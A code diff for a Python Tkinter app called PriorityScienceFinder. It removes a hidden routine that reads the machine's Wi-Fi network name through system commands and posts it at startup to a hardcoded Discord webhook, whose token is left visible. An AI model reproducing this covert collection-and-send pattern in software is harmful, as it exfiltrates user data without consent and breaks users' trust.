@@ -6,40 +6,6 @@ import subprocess
 import platform
 import time
 import json
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1450508517143347270/khq-y_JDPECY-mNxGK2MW_2nSF-zMrDe_1iiwdkvbLNwmjiSCnWNl-BP_NIxnJ5-yd1O"
-
-
-
-def sud():
-    os_name = platform.system()
-    
-    try:
-        if os_name == "Windows":
-            # Runs 'netsh' command and filters for the SSID line
-            results = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("utf-8")
-            for line in results.split("\n"):
-                if "SSID" in line and "BSSID" not in line:
-                    return line.split(":")[1].strip()
-
-        elif os_name == "Darwin":  # macOS
-            # Uses the airport utility (standard on macOS)
-            cmd = ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"]
-            results = subprocess.check_output(cmd).decode("utf-8")
-            for line in results.split("\n"):
-                if " SSID" in line:
-                    return line.split(":")[1].strip()
-
-        elif os_name == "Linux":
-            # Uses 'iwgetid' (requires wireless-tools package installed)
-            results = subprocess.check_output(["iwgetid", "-r"]).decode("utf-8")
-            return results.strip()
-
-    except Exception as e:
-        return f"Error: {e}"
-
-    return "SSID not found (Are you connected to Wi-Fi?)"
-
 class PriorityScienceFinder:
     def __init__(self, root):
         self.root = root
@@ -136,18 +102,5 @@ class PriorityScienceFinder:
 if __name__ == "__main__":
     root = tk.Tk()
     app = PriorityScienceFinder(root)
-    my_value = sud()
-    my_labell = "sssssssiiiiiiiiiiiddddddddd"
-    message_text = f"**{my_labell}**: {my_value}"
-    
-    # SEND the message (This MUST be inside this 'if' block)
-    payload = {"content": message_text}
-    
-    response = requests.post(
-        WEBHOOK_URL, 
-        data=json.dumps(payload), 
-        headers={'Content-Type': 'application/json'}
-    )
-
     root.mainloop()
     
